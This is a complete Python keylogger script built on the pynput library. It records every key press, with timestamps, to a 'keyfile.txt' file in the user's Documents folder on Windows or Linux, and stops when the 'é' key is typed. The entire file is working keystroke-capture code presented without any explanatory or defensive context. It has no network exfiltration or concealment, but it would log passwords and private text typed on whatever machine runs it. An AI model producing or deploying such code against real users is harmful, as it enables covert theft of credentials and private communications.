from pynput import keyboard
import logging
import threading
import os
import platform

def get_documents_path():
    system = platform.system()
    if system == "Windows":
        return os.path.expanduser("~/Documents")
    elif system == "Linux":
        return os.path.expanduser("~/Documents")
    else:
        raise EnvironmentError("Unsupported operating system")

documents_path = get_documents_path()
log_file = os.path.join(documents_path, "keyfile.txt")

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s', 
    encoding='utf-8'
)

stop_keylogger = False

def keyPressed(key):
    global stop_keylogger
    try:
        if hasattr(key, 'char') and key.char:
            char = key.char
            logging.info(f'Pressed: {char}')
            if char == 'é':
                stop_keylogger = True
                logging.info('Keylogger stopped by user.')
                return False
        else:
            logging.info(f'Pressed: [{key}]')
    except AttributeError:
        logging.info(f'Pressed: [{key}]')

def start_listener():
    logging.info('Keylogger started.')
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()

if __name__ == "__main__":
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.start()
    listener_thread.join()
    if stop_keylogger:
        logging.info('Keylogger has been stopped.')
